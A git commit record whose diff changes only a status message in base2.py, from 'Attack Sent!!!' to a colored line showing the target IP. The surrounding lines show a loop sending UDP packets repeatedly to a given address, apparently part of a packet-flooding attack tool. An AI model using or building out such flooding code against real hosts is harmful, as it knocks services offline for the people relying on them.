af1fe0b04b34c72b55fdc8fbba285ea5a1a29a8d
KUNF24 <kunf5616@gmail.com>
2024-12-21 15:28:43 +0700

    Update base2.py

--- base2.py
+++ base2.py
@@ -74,7 +74,7 @@ def run():
 			addr = (str(ip),int(port))
 			for x in range(times):
 				s.sendto(data,addr)
-			print(i +"Attack Sent!!!")
+			print(i +" \033[97mAttack Sent  \033[95m" +str(ip)+ " \033[0m")
 		except:
 			print("[!] Error!!!")
 
